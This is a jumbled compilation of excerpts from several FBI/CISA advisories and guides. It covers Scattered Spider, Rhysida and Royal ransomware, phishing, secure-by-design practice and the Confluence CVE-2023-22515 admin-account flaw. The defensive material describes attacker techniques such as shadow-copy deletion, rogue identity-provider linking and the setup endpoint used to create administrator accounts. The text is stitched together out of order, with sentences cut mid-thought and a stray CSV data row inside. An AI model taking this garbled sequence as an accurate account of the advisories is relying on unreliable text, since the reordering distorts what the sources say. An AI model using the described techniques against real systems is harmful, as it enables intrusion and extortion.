U.S.-based data centers and MEGA[.]NZ [T1567.002]. According to trusted third parties, where more recent incidents are concerned, Scattered Spider threat  actors may have deployed BlackCat/ALPHV ransomware onto victim networks—thereby encrypting  VMware Elastic Sky X integrated (ESXi) servers [T1486]. The FBI and CISA recommend  that software manufactures incorporate  secure-by-design and -default principles  and tactics into their software development  practices limiting the impact of ransomware  techniques, thus, strengthening the secure  posture for their customers.   Segment networks to prevent the spread of ransomware. Network segmentation can help  prevent the spread of ransomware by controlling traffic flows between—and access to— various subnetworks and by restricting adversary lateral movement [CPG 2.F].

TLP:CLEAR Product ID: AA23-320A November 16, 2023 Co-Authored by:  TLP:CLEAR Scattered Spider  SUMMARY  The Federal Bureau of Investigation (FBI) and Cybersecurity  and Infrastructure Security Agency (CISA) are releasing this  joint Cybersecurity Advisory (CSA) in response to recent  activity by Scattered Spider threat actors against the  commercial facilities sectors and subsectors. See the MITRE  ATT&CK® Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE  ATT&CK tactics and techniques. According to public reporting,  Scattered Spider threat actors have [2],[3],[4]:    Posed as company IT and/or helpdesk staff using phone calls or SMS messages to obtain  credentials from employees and gain access to the network [T1598],[T1656]. After gaining access to networks, FBI observed Scattered Spider threat actors using publicly  available, legitimate remote access tunneling tools. Scattered Spider threat actors have historically evaded detection on target networks by using living off  the land techniques and allowlisted applications to navigate victim networks, as well as frequently  modifying their TTPs. Recent Scattered Spider TTPs  New TTP - File Encryption  More recently, the FBI has identified Scattered Spider threat actors now encrypting victim files after  exfiltration [T1486]. After exfiltrating and/or encrypting data, Scattered Spider threat actors  communicate with victims via TOR, Tox, email, or encrypted applications. After identifying usernames, passwords, PII  [T1589], and conducting SIM swaps, the threat actors then use social engineering techniques [T1656]  to convince IT help desk personnel to reset passwords and/or MFA tokens  [T1078.002],[T1199],[T1566.004] to perform account takeovers against the users in single sign-on  (SSO) environments. Execution, Persistence, and Privilege Escalation  Scattered Spider threat actors then register their own MFA tokens [T1556.006],[T1606] after  compromising a user’s account to establish persistence [TA0003]. Further, the threat actors add a  federated identity provider to the victim’s SSO tenant and activate automatic account linking  [T1484.002]. The threat actors are then able to sign into any account by using a matching SSO  account attribute. At this stage, the Scattered Spider threat actors already control the identity provider  and then can choose an arbitrary value for this account attribute. As a result, this activity allows the  threat actors to perform privileged escalation [TA0004] and continue logging in even when passwords  are changed [T1078]. Discovery, Lateral Movement, and Exfiltration  Once persistence is established on a target network, Scattered Spider threat actors often perform  discovery, specifically searching for SharePoint sites [T1213.002], credential storage documentation  [T1552.001], VMware vCenter infrastructure [T1018], backups, and instructions for setting up/logging  into Virtual Private Networks (VPN) [TA0007]. The threat actors enumerate the victim’s Active  Directory (AD), perform discovery and exfiltration of victim’s code repositories [T1213.003], code- signing certificates [T1552.004], and source code [T1083],[TA0010]. Threat actors activate Amazon  Web Services (AWS) Systems Manager Inventory [T1538] to discover targets for lateral movement  [TA0007],[TA0008], then move to both preexisting [T1021.007] and actor-created [T1578.002]  Amazon Elastic Compute Cloud (EC2) instances. In instances where the ultimate goal is data  exfiltration, Scattered Spider threat actors use actor-installed extract, transform, and load (ETL) tools         FBI  CISA TLP:CLEAR  Page 5 of 14  |  Product ID: AA23-320A  TLP:CLEAR   [T1648] to bring data from multiple data sources into a centralized database [T1074],[T1530]. To determine if their activities have been uncovered and maintain persistence, Scattered Spider  threat actors often search the victim’s Slack, Microsoft Teams, and Microsoft Exchange online for  emails [T1114] or conversations regarding the threat actor’s intrusion and any security response. The  threat actors frequently join incident remediation and response calls and teleconferences, likely to  identify how security teams are hunting them and proactively develop new avenues of intrusion in  response to victim defenses.

The Federal Bureau of Investigation (FBI), Cybersecurity  and Infrastructure Security Agency (CISA), and the Multi- State Information Sharing and Analysis Center (MS-ISAC) are releasing this joint CSA to disseminate  known Rhysida ransomware IOCs and TTPs identified through investigations as recently as  September 2023. Rhysida—an emerging ransomware variant—has predominately been deployed  against the education, healthcare, manufacturing, information technology, and government sectors  since May 2023. FBI, CISA, and the MS-ISAC encourage organizations to implement the recommendations in the  Mitigations section of this CSA to reduce the likelihood and impact of Rhysida ransomware and other  ransomware incidents. •  Segment networks to prevent the  spread of ransomware. Overview  Threat actors leveraging Rhysida ransomware are known to impact “targets of opportunity,” including  victims in the education, healthcare, manufacturing, information technology, and government sectors. Open source reporting details similarities between Vice Society (DEV-0832)[1] activity and the actors  observed deploying Rhysida ransomware. Additionally, open source reporting[2] has confirmed  observed instances of Rhysida actors operating in a ransomware-as-a-service (RaaS) capacity,  where ransomware tools and infrastructure are leased out in a profit-sharing model. Any ransoms  paid are then split between the group and the affiliates. For additional information on Vice Society actors and associated activity, see the joint CSA  #StopRansomware: Vice Society.

FBI | CISA | MS-ISAC TLP:CLEAR  Page 5 of 16  |  Product ID: AA23-319A  TLP:CLEAR Rhysida ransomware uses a Windows 64-bit Portable Executable (PE) or common object file format  (COFF) compiled using MinGW via the GNU Compiler Collection (GCC), which supports various  programming languages such as C, C++, and Go. The cryptographic ransomware application first  injects the PE into running processes on the compromised system [T1055.002]. Encryption  After mapping the network, the ransomware encrypts data using a 4096-bit RSA encryption key with a  ChaCha20 algorithm [T1486]. As shown in Figure 1, Rhysida ransomware drops a ransom  note named “CriticalBreachDetected” as a PDF file—the note provides each company with a unique  code and instructions to contact the group via a Tor-based portal. Command and  Scripting Interpreter:  Windows Command  Shell  T1059.003  Rhysida actors used batch scripting to place 1.ps1 on  victim systems to automate ransomware execution.

FBI, CISA,  and the MS-ISAC recommend incorporating secure-by-design and -default principles, limiting the  impact of ransomware techniques and strengthening overall security posture. •  Segment networks to prevent the spread of ransomware. Network segmentation can help  prevent the spread of ransomware by controlling traffic flows between—and access to— various subnetworks and by restricting adversary lateral movement [CPG 2.F]. •  Identify, detect, and investigate abnormal activity and potential traversal of the  indicated ransomware with a network monitoring tool. To aid in detecting ransomware,  implement a tool that logs and reports all network traffic, including lateral movement activity on  a network. Furthermore, payment may also embolden adversaries to target additional organizations,  encourage other threat actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, FBI and CISA urge  you to promptly report ransomware incidents to the FBI’s Internet Crime Complaint Center (IC3) at  Ic3.gov, a local FBI Field Office, or CISA via the agency’s Incident Reporting System or its 24/7  Operations Center at report@cisa.gov or (888) 282-0870.

#StopRansomware: Royal Ransomware Update,2023-11-13,4,"{'phishing': 7, 'extortion': 3, 'ransomware': 34, 'threats_of_violence': 32, 'malware': 2}"," Train users to recognize and report phishing attempts. Phishing emails are  among the most successful vectors for initial access by Royal threat actors. Initial Access  Royal actors gain initial access to victim networks in several ways including:     Phishing. According to third-party reporting, Royal actors most commonly (in 66.7% of  incidents) gain initial access to victim networks via successful phishing emails [T1566]. o According to open source reporting, victims have unknowingly installed malware that  delivers Royal ransomware after receiving phishing emails containing malicious PDF  documents [T1566.001] and malvertising [T1566.002].[2]         Page 3 of 14 | Product ID: AA23-061A  TLP:CLEAR FBI | CISA TLP:CLEAR    Remote Desktop Protocol (RDP). Phishing: Spear phishing  Attachment  T1566.001  The actors gain initial access through malicious  PDF attachments sent via email. Phishing: Spear phishing Link  T1566.002  The actors gain initial access using malvertising  links via emails and public-facing sites. Royal  actors have made ransom demands ranging from approximately $1 million to $11 million USD in  Actions to take today to  mitigate cyber threats from  ransomware:    Prioritize remediating known exploited vulnerabilities. Royal conducts data exfiltration and extortion prior to  encryption and then publishes victim data to a leak site if a ransom is not paid. This approach allows the actor to lower the encryption  percentage for larger files, which helps evade detection.[1] In addition to encrypting files, Royal actors  also engage in double extortion tactics in which they threaten to publicly release the encrypted data if  the victim does not pay the ransom. TLP:CLEAR Product ID: AA23-061A November 13, 2023 Coauthored by: TLP:CLEAR  #StopRansomware: Royal Ransomware Update  SUMMARY  Update November 13, 2023  This CSA is being re-released to add new TTPs, IOCs, and information related to Royal Ransomware  activity. End of Update  Note: This joint Cybersecurity Advisory (CSA) is part of an  ongoing #StopRansomware effort to publish advisories for  network defenders that detail various ransomware variants and  ransomware threat actors. These #StopRansomware advisories  include recently and historically observed tactics, techniques,  and procedures (TTPs) and indicators of compromise (IOCs) to  help  organizations  protect  against  ransomware. Visit  stopransomware.gov to see all #StopRansomware advisories  and to learn more about other ransomware threats and no-cost  resources. The Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency  (CISA) are releasing this joint CSA to disseminate known Royal ransomware IOCs and TTPs  identified through FBI threat response activities as recently as June 2023. and international  organizations with Royal ransomware. After  gaining access to victims’ networks, Royal actors disable antivirus software and exfiltrate large  amounts of data before ultimately deploying the ransomware and encrypting the systems. Update November 13, 2023  Since September 2022, Royal has targeted over 350 known victims worldwide and ransomware  demands have exceeded 275 million USD. Blacksuit ransomware shares  a number of identified coding characteristics similar to Royal. A previous joint CSA for Royal  ransomware was published on March 2, 2023. End Update  FBI and CISA encourage organizations to implement the recommendations found in the Mitigations  section of this CSA to reduce the likelihood and impact of ransomware incidents. Royal ransomware uses a unique partial encryption approach that allows the threat actor to choose a  specific percentage of data in a file to encrypt. Ransomware operators often  use open source projects to aid their intrusion activities—Royal operators have recently been  observed using Chisel, a tunneling tool transported over HTTP and secured via SSH [T1572], to  communicate with their C2 infrastructure. FBI observed multiple Qakbot C2s used in Royal  ransomware attacks but is yet to determine if Royal ransomware exclusively uses Qakbot C2s. Batch files create a new admin user [T1078.002], force a group policy update, set  pertinent registry keys to auto-extract [T1119] and execute the ransomware, monitor the encryption  process, and delete files upon completion—including Application, System, and Security event logs  [T1070.001]. Malicious files have been found in victim networks in the following directories:    C:\Temp\    C:\Users\<user>\AppData\Roaming\    C:\Users\<users>\    C:\ProgramData\  Indicators of Compromise (IOC)  See Tables 1 and 2 for Royal ransomware IOCs obtained by FBI during threat response activities as  of January 2023.

Page 12 of 14 | Product ID: AA23-061A  TLP:CLEAR FBI | CISA TLP:CLEAR  MITIGATIONS  FBI and CISA recommend network defenders apply the  following mitigations to limit potential adversarial use of  common system and network discovery techniques, and  to reduce the risk of compromise by Royal ransomware. FBI and CISA recommend that  software manufactures incorporate secure-by- design and -default principles and tactics into  their software development practices limiting the  impact of ransomware techniques (such as  threat actors leveraging backdoor vulnerabilities  into remote software systems) thus  strengthening the security posture for their  customers. Network segmentation can help prevent the spread of  ransomware by controlling traffic flows between—and access to—various subnetworks and by  restricting adversary lateral movement.   Identify, detect, and investigate abnormal activity and potential traversal of the  indicated ransomware with a networking monitoring tool. To aid in detecting ransomware,  implement a tool that logs and reports all network traffic [CPG 5.1], including lateral movement  activity on a network.

Since approximately September 2022, cyber threat actors have compromised U.S. Instead, the note, which appears after encryption, requires victims to  directly interact with the threat actor via a .onion URL (reachable through the Tor browser). FBI has also observed Royal threat actors gain initial access  through exploiting public-facing applications [T1190]. Reports from trusted third-party sources indicate that Royal threat actors may  leverage brokers to gain initial access and source traffic by harvesting virtual private network  (VPN) credentials from stealer logs. Lateral Movement and Persistence  Royal threat actors often use RDP to move laterally across a network [T1021.001]. FBI observed Royal threat  actors using remote monitoring and management (RMM) software such as AnyDesk, LogMeIn, and  Atera for persistence in the victim’s network [T1133]. In some instances, the threat actors moved  laterally to the domain controller. In one confirmed case, the threat actors used a legitimate admin  account to remotely log on to the domain controller [T1078]. Once on the domain controller, the threat  actor deactivated antivirus protocols [T1562.001] by modifying Group Policy Objects [T1484.001]. Exfiltration  Royal threat actors exfiltrate data from victim networks by repurposing legitimate cyber penetration  testing tools such as Cobalt Strike and malware tools and derivatives such as Ursnif/Gozi for data  aggregation and exfiltration. According to third-party reporting, Royal threat actors’ first hop in  exfiltration and other operations is usually a U.S. Encryption  Before starting the encryption process, Royal threat actors:    Use Windows Restart Manager to determine whether targeted files are currently in use or  blocked by other applications [T1486].[1]    Use Windows Volume Shadow Copy service (vssadmin.exe) to delete shadow copies to  inhibit system recovery.[1]         Page 4 of 14 | Product ID: AA23-061A  TLP:CLEAR FBI | CISA TLP:CLEAR  FBI has found numerous batch (.bat) files on impacted systems which are typically transferred as an  encrypted 7zip file. See Table 5 for a list  of legitimate software used by Royal and Blacksuit threat actors identified through FBI investigations  as of June 2023. Threat actors have been observed using open source network  tunneling tools such as Chisel and Cloudflared, as well as Secure Shell (SSH) Client, OpenSSH, and  MobaXterm to establish SSH connections. These mitigations follow CISA’s Cybersecurity  Performance Goals (CPGs), which provide a minimum  set of practices and protections that are informed by the  most common and impactful threats, TTPs, and yield  goals that all organizations across critical infrastructure  sectors should implement.   Implement a recovery plan to maintain and  retain multiple copies of sensitive or proprietary  data and servers [CPG 7.3] in a physically  separate, segmented, and secure location (i.e.,  hard drive, storage device, or the cloud).   Reduce the threat of malicious actors using remote access tools by applying mitigations in  joint Guide to Securing Remote Access Software. Timely patching is one of  the most efficient and cost-effective steps an organization can take to minimize its exposure to  cybersecurity threats. If threat  actors are not able to run these tools, they will have difficulty escalating privileges and/or  moving laterally. REPORTING  FBI is seeking any information that can be shared, to include boundary logs showing communication  to and from foreign IP addresses, a sample ransom note, communications with Royal threat actors,  Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file."

TLP:CLEAR  Page | 3  TLP:CLEAR  INTRODUCTION  Ransomware is a form of malware designed to  encrypt files on a device, rendering them and the  systems that rely on them unusable. Over time, malicious actors have  adjusted their ransomware tactics to be more  destructive and impactful and have also exfiltrated victim data and pressured victims to pay by  threatening to release the stolen data. This guide is an update to the Joint Cybersecurity  and Infrastructure Security Agency (CISA) and  Multi-State Information Sharing & Analysis Center  (MS-ISAC) Ransomware Guide released in  September 2020 (see What’s New) and was  developed through the JRTF. Joint Ransomware Task Force (JRTF). The JRTF, co-chaired by CISA and FBI, is an  interagency, collaborative effort to combat the  growing threat of ransomware attacks. The  JRTF was launched in response to a series of  high-profile ransomware attacks on U.S. Government's response to ransomware  attacks and facilitates information sharing  and collaboration between government  agencies and private sector partners. Ensures operational coordination for  activities such as developing and sharing  best practices for preventing and responding  to ransomware attacks, conducting joint  investigations and operations against  ransomware threat actors, and providing  guidance and resources to organizations  that have been victimized by ransomware. Represents a significant step forward in  enabling unity of effort across the U.S  Government's efforts to address the growing  threat of ransomware attacks. For more info on JRTF, see cisa.gov/joint- ransomware-task-force. Engaging with peer organizations and CISA enables your organization to receive critical and timely  information and access to services for managing ransomware and other cyber threats. What’s New  Since the initial release of the Ransomware Guide in September 2020, ransomware actors have  accelerated their tactics and techniques. •  Incorporated the #StopRansomware effort into  the title. •  Expanded the ransomware response checklist with threat hunting tips for detection and  analysis. #StopRansomware is CISA and FBI’s effort  to publish advisories for network defenders  that detail network defense information  related to various ransomware variants and  threat actors. Visit stopransomware.gov to  learn more and to read the joint advisories. It is  important that backups are maintained offline, as most  ransomware actors attempt to find and subsequently  delete or encrypt accessible backups to make  restoration impossible unless the ransom is paid. Ransomware actors often hunt for and collect credentials stored in the targeted environment  and use those credentials to attempt to access backup solutions; they also use publicly  available exploits to target unpatched backup solutions. o Review available incident response guidance, such as the Ransomware Response  Checklist in this guide and Public Power Cyber Incident Response Playbook to:    Help your organization better organize around cyber incident response. These  macros can be used to deliver ransomware [CPG 2.N]. This  enables detection of both “precursor”  malware and ransomware. o A ransomware infection may be  evidence of a previous, unresolved  network compromise. For example, many ransomware infections are the result of  existing malware infections, such as QakBot, Bumblebee, and Emotet. o In some cases, ransomware deployment is the last step in a network compromise and is  dropped to obscure previous post-compromise activities, such as business email  compromise (BEC). •  Consider implementing an intrusion detection system (IDS) to detect command and control  activity and other potentially malicious network activity that occurs prior to ransomware  deployment. • Impersonating employees: Ransomware actors  have posed as company IT and/or helpdesk  staff in phone calls or SMS messages to obtain  credentials from employees and gain access to  the network. MSPs have been an infection vector for ransomware impacting numerous client organizations [CPG 1.I]. • Malicious actors may target MSPs with the goal of compromising MSP client organizations; they may use MSP network connections and access to client organizations as a key vector to propagate malware and ransomware. Malicious actors often leverage privileged accounts for network-wide ransomware attacks. Emerging ransomware strategies have begun targeting VMware ESXi servers, hypervisors, and other centralized tools and systems, which enables fast encryption of the infrastructure at scale. For more information about ransomware resilience and hardening of VMware and other virtualization infrastructure, see: o NIST Special Publication (SP 800-125A Rev.1): Security Recommendations for Server- based Hypervisor Platforms o VMware: Cloud Infrastructure Security Configuration & Hardening • Leverage best practices and enable security settings in association with cloud environments, such as Microsoft Office 365. o Enable delete protection or object lock on storage resources often targeted in ransomware attacks (e.g., object storage, database storage, file storage, and block storage) to prevent data from being deleted or overwritten, respectively. Threat actors use PowerShell to deploy  ransomware and hide their malicious activities. Malicious actors often target and use DCs as a staging  point to spread ransomware network wide. Detection and Analysis  Refer to the best practices and references  below to help manage the risk posed by  ransomware and support your organization’s  coordinated and efficient response to a  ransomware incident. Not doing so could cause actors to move laterally to preserve their  access or deploy ransomware widely prior to networks being taken offline. Power down devices if you are unable to disconnect them from the network to avoid  further spread of the ransomware infection. Note: This step will prevent your organization from maintaining ransomware infection artifacts  and potential evidence stored in volatile memory. Additionally, paying ransoms may pose sanctions  risks. Department of the Treasury Office of  Foreign Assets Control (OFAC) memorandum from  September 2021, Updated Advisory on Potential  Sanctions Risks for Facilitating Ransomware  Payments. A ransomware event may be evidence of a previous, unresolved  network compromise.   Malicious actors often drop ransomware variants to obscure post-compromise  activity. Misuse of these tools is a  common ransomware technique to inhibit system recovery. For example,  ransomware actors have used Chisel to tunnel Secure Shell (SSH) over  HTTPS port 443. Ransomware actors have also used Cloudflared to  abuse Cloudflare tunnels to tunnel communications over HTTPS. TLP:CLEAR  Page | 24  TLP:CLEAR  Reporting and Notification  Note: Refer to the Contact Information  section at the end of this guide for details on  how to report and notify about ransomware  incidents.

Threat actors often gain initial access to a network through exposed and poorly  secured remote services, and later traverse the network using the native Windows RDP client. Threat actors also often gain access by exploiting virtual private networks (VPNs) or using  compromised credentials.   PowerShell logs contain valuable data, including historical OS and registry  interaction and possible tactics, techniques, and procedures of a threat actor’s  PowerShell use. Malicious actors will sometimes use this access to exfiltrate data and  then threaten to release the data publicly before ransoming the network to further  extort the victim and pressure them into paying. Initiate threat hunting activities. •  Presence of Rclone, Rsync, and various web-based file storage services,  and FTP/SFTP, which are common tools for data exfiltration (and also  used by threat actors to implant malware/tools on affected networks.)    Newly created services, unexpected scheduled tasks, unexpected software  installed, unusual files created, legitimate processes with unexpected child  processes, etc. TLP:CLEAR  Page | 28  TLP:CLEAR  Contact Information  In responding to any cyber incident, federal agencies will undertake threat response; asset response;  and intelligence support and related activities.

Phishing is a form of  social engineering where malicious actors lure victims (typically  via email) to visit a malicious site or deceive them into providing  login credentials. Malicious actors primarily leverage phishing  for:  •  Obtaining login credentials. Malicious actors conduct  phishing campaigns to steal login credentials for initial  network access. Malicious actors commonly conduct  phishing campaigns to deploy malware for follow-on activity,  such as interrupting or damaging systems, escalating user  privileges, and maintaining persistence on compromised  systems. The Cybersecurity and Infrastructure Security Agency (CISA),  National Security Agency (NSA), Federal Bureau of Investigation  (FBI), and Multi-State Information Sharing and Analysis Center  (MS-ISAC) are releasing this joint guide to outline phishing  techniques malicious actors commonly use and to provide  guidance for both network defenders and software  manufacturers. This will help to reduce the impact of phishing  attacks in obtaining credentials and deploying malware. Therefore, this guide includes a section of  tailored recommendations for small- and medium-sized  businesses that may not have the resources to hire IT staff  dedicated to a constant defense against phishing threats. Manufacturers  should develop and supply software that is secure against the  most prevalent phishing threats, thereby increasing the  cybersecurity posture of their customers.

MALWARE-BASED PHISHING  DEFINITION  In malware-based phishing attacks, Malicious actors pose as trustworthy sources (e.g., colleagues,  acquaintances, or organizations) to lure a victim into interacting with a malicious hyperlink or  opening an email attachment to execute malware on host systems. o Malicious actors may use free, publicly available tools (such as GoPhish or Zphisher) to  facilitate spearphishing campaigns where individual users are targeted with specific and  convincing lures. PROTECTING LOGIN CREDENTIALS  CISA, NSA, FBI, and MS-ISAC recommend organizations implement the following to reduce the  likelihood of successful login credential phishing.

PREVENTING MALWARE EXECUTION  CISA, NSA, FBI, and MS-ISAC recommend organizations implement the following to reduce the  likelihood of successful malware execution following phishing attacks. •  Use denylists to block known malicious domains, URLs, and IP addresses as well as file  extensions such as .scr, .exe, .pif, and .cpl and mislabeled file extensions (e.g., a .exe file that is  labeled as a .doc file.)  o State local tribal and territory (SLTT) entities should enable malicious domain blocking  and reporting (MDBR), which is a cloud-based solution with recursive domain name  system (DNS) technology that works to prevent users from connecting to malicious  CISA | NSA | FBI | MS-ISAC  TLP:CLEAR  7                                                                                                                                                                                                                                                                 PHISHING GUIDANCE: STOPPING THE ATTACK CYCLE AT PHASE ONE  TLP:CLEAR  domains. o For more information on protective phishing filters, refer to Microsoft, MacOS, or Google’s  guidance on phishing and malware protection.[2],[3],[4],[5] CISA, NSA, FBI, and MS-ISAC  recommend reaching out to vendors or service providers to learn about what phishing  filters and malware protections are available. SMALL- AND MEDIUM-SIZED BUSINESSES (SMBs) OR ORGANIZATIONS  CISA, NSA, FBI, and MS-ISAC recommend that small- and medium-sized organizations with limited  resources prioritize the following best practices to protect network resources from prevalent phishing  threats:  •  User phishing awareness training: Implement a standard anti-phishing training program and  require employees to review phishing training material annually. Additionally, conclude the  CISA | NSA | FBI | MS-ISAC  TLP:CLEAR  8                                                                                                                                                                                                                                                                                                                                          PHISHING GUIDANCE: STOPPING THE ATTACK CYCLE AT PHASE ONE  TLP:CLEAR  program evolution with a training check that certifies that the employee has retained all the  information outlined in the training program. o Small businesses are encouraged to implement commercial phishing awareness training  programs to employees. Additionally, NIST offers free anti-phishing training resources for  small businesses on their Small Business Cybersecurity Corner: Phishing webpage. o The Department of Justice (DOJ) offers Anti-Phishing Training Program Support to federal  organizations. o The Federal Trade Commission (FTC) offers guidance to protect small businesses from  phishing threats on their Cybersecurity for Small Businesses: Phishing webpage. •  Identify network phishing vulnerabilities: Federal organizations are encouraged to participate in  CISA’s Phishing Vulnerability Scanning assessment service. •  Enable MFA: Activating a strong MFA is the best way that small businesses can protect their  internet facing business accounts from phishing related threats. Additionally, CISA, NSA, FBI, and MS-ISAC recommend SMBs implement the technical solutions  below to prevent phishing related compromises:  •  Implement strong password policies to authenticate users.

Providers also commonly perform robust email traffic monitoring and anti- phishing malware services. SOFTWARE MANUFACTURERS  CISA, NSA, FBI, and MS-ISAC recommend software manufacturers incorporate secure-by-design and ­ default principles and tactics into their software development practices, reducing the susceptibility of  their customers to phishing attacks. To mitigate the success of phishing emails reaching users and users interacting with the email, the  authoring organizations recommend the following:  •  Perform field testing of email software.

To mitigate successful malware execution following phishing attacks:  •  Ensure phishing filtering and blocking mechanisms are packaged with email software by default  to prevent successful malware deployment. INCIDENT RESPONSE  If an organization identifies compromised credentials and/or successful malware from phishing  activity, remediate the activity by:  1. Auditing account access following a confirmed phishing incident to ensure malicious actors  no longer have access to the initially impacted account. Isolating the affected workstation after the detection of a phishing attack.

Implement threat modeling to test the email software  against various deployment scenarios while considering use-cases for organizations ranging from  small to large and configure the software with secure defaults based on the test findings. •  Malware deployment. EXAMPLE TECHNIQUES  To execute malware on host systems, malicious actors commonly:  •  Send malicious hyperlinks or attachments that cause a user to download malware, facilitating  initial access, information stealing, damage or disruption to systems or services, and/or the  escalation of account privileges. •  Use smartphone or tablet apps, along with SMS, to send text messages or chats in collaboration  platforms (i.e., Slack, Teams, Signal, WhatsApp, iMessage, and Facebook Messenger) to lure  users into interacting with a malicious hyperlink or attachment that executes malware. •  Incorporate denylists at the email gateway and enable firewall rules to prevent successful  malware deployment. •  Implement remote browser isolation (RBI) solutions that prevent malware propagation through  quarantining the malware sample upon user execution. RBI solutions run applications that  quarantine malware when a user interacts with a malicious link or binary to prevent further  spread into the environment. Configure RBI solutions in remote workstations so that any  malware is contained within an isolation boundary and cannot access an organization’s  resources. •  Implement free security tools like Quad9 or Google Safe Browsing to identify and stop malware  upon user execution. •  Implement anti-virus solutions to mitigate malware and to stop malware from executing if a  malicious hyperlink or attachment from an email is opened. These policies also prevent users from visiting malicious websites  that often contain malware that can either harvest user credentials or deploy additional malware  to damage organizational systems. This helps stop the  executed malware from spreading further into the organization’s network. Analyzing the malware. After isolating the affected workstation(s), have the malware  analyzed by a team that specializes in malware analysis. After analysis,  specialists will know how to safely handle the malware. Learn more by visiting CISA’s  malware analysis services and resources webpage. Eradicating the malware. Eradicate the malware from the network so other workstations  within the organization’s networks can no longer be negatively impacted by the executed  malware."

Software  manufacturers should perform a risk assessment to identify and enumerate  prevalent cyber threats to critical systems, and then include protections in  product blueprints that account for the evolving cyber threat landscape. The authoring organizations further  recommend manufacturers use a tailored threat model during the product  development stage to address all potential threats to a system and account  for each system’s deployment process. There is no single solution to end the persistent threat of malicious  cyber actors exploiting technology vulnerabilities, and products that are  “secure by design” will continue to suffer vulnerabilities; however, a large  set of vulnerabilities are due to a relatively small subset of root causes. These  products protect against the most prevalent threats and vulnerabilities  without end-users having to take additional steps to secure them. Use a tailored threat model during resource allocation and development to prioritize  the most critical and high-impact features. Threat models consider a product’s specific  use-case and enables development teams to fortify products. Explicit  threat modeling is a tactic that may help inform the decision of which features should be  on by default or which settings are needed to be secure by default. An application’s settings should be continuously evaluated whether the settings were the  default or set by the customer, against the manufacturer’s current understanding of the  threat landscape. It helps those conventions change over time in response to customer  needs, changes in threat actor tactics or economics, or technology evolution. Conversations about information sharing should  expand beyond real-time threat indicators, to include the elements below. If we are to collectively overcome the threats posed by intelligent  and adaptive adversaries, we must embrace levels of transparency that will  feel uncomfortable today, but that will drive the industry forward. Publish high-level threat models. Secure by design products start with  written threat models that describe  what the creators are trying to protect  and from whom. Effective threat models  are informed by the way intrusions  happen in the wild, and should cover  both the enterprise and development  environments, as well as the way the  software manufacturers intend for it to be  used in customer environments. Chief information security  officer (CISO) reports to corporate boards  usually include information about current  and planned security programs, threats,  suspected and confirmed security incidents,  and other updates centered on the security  posture and health of the company. As such, their introduction should be prioritized based on  tailored threat modeling, criticality, complexity, and business impact. When configuration is  necessary, the default option should be broadly secure against common threats."

This recently  disclosed vulnerability affects certain versions of Atlassian Confluence Data Center and Server,  enabling malicious cyber threat actors to obtain initial access to Confluence instances by creating  unauthorized Confluence administrator accounts. Threat actors exploited CVE-2023-22515 as a zero- day to obtain access to victim systems and continue active exploitation post-patch. •  8.0.0  •  8.0.1  •  8.0.2  •  8.0.3  •  8.0.4  •  8.1.0  •  8.1.1  •  8.1.3  •  8.1.4  •  8.2.0  •  8.2.1  •  8.2.2  •  8.2.3  •  8.3.0  •  8.3.1  •  8.3.2  •  8.4.0  •  8.4.1  •  8.4.2  •  8.5.0  •  8.5.1  Unauthenticated remote threat actors can exploit this vulnerability to create unauthorized Confluence  administrator accounts and access Confluence instances. More specifically, threat actors can change  the Confluence server’s configuration to indicate the setup is not complete and use the  /setup/setupadministrator.action endpoint to create a new administrator user. Considering the root cause of the vulnerability allows threat actors to modify critical configuration  settings, CISA, FBI, and MS-ISAC assess that the threat actors may not be limited to creating new  administrator accounts. Open source further indicates an Open Web Application Security Project  (OWASP) classification of injection (i.e., CWE-20: Improper Input Validation) is an appropriate  description.[2] Atlassian released a patch on October 4, 2023, and confirmed that threat actors  exploited CVE-2023-22515 as a zero-day—a previously unidentified vulnerability.[1]  On October 5, 2023, CISA added this vulnerability to its Known Exploited Vulnerabilities Catalog  based on evidence of active exploitation. Threat  actors were observed using Rclone to either upload a configuration file to victim infrastructure or enter  cloud storage credentials via the command line. Note: As additional threat actors  begin to use this CVE due to the availability of publicly posted proof-of-concept code, an increasing  variation in User-Agent strings is expected.

INCIDENT RESPONSE  Organizations are encouraged to review all affected Confluence instances for evidence of  compromise, as outlined by Atlassian.[1] If compromise is suspected or detected, organizations  should assume that threat actors hold full administrative access and can perform any number of  unfettered actions—these include but are not limited to exfiltration of content and system credentials,  as well as installation of malicious plugins. Note: Upgrading to fixed versions, as well as removing malicious administrator  accounts may not fully mitigate risk considering threat actors may have established  additional persistence mechanisms. Malicious cyber threat actors who exploit the affected instance can escalate to  administrative privileges.

The FBI and CISA recommend that  software manufactures incorporate secure-by- design and -default principles and tactics into  their software development practices to limit the  impact of ransomware techniques (such as  threat actors leveraging backdoor vulnerabilities  into remote software systems), thus,  strengthening the secure posture for their  customers. •  Segment networks to prevent the spread of ransomware. Network segmentation can  help prevent the spread of ransomware by controlling traffic flows between—and access  to—various subnetworks, restricting further lateral movement [CPG 2.F]. •  Identify, detect, and investigate abnormal activity and potential traversal of the  indicated ransomware with a networking monitoring tool. To aid in detecting  ransomware, implement a tool that logs and reports all network traffic, including lateral  movement activity on a network. RESOURCES  •  Stopransomware.gov is a whole-of-government approach that gives one central location  for ransomware resources and alerts. •  The Joint Ransomware Guide provides preparation, prevention, and mitigation best  practices as well as a ransomware response checklist. •  Cyber Hygiene Services and Ransomware Readiness Assessment provide no-cost  cyber hygiene and ransomware readiness assessment services. Furthermore, payment may also embolden adversaries  to target additional organizations, encourage other criminal actors to engage in the distribution  of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have  decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents  to the FBI Internet Crime Complaint Center (IC3) at ic3.gov, local FBI Field Office, or CISA via  the agency’s Incident Reporting System or its 24/7 Operations Center at report@cisa.gov or  (888) 282-0870.

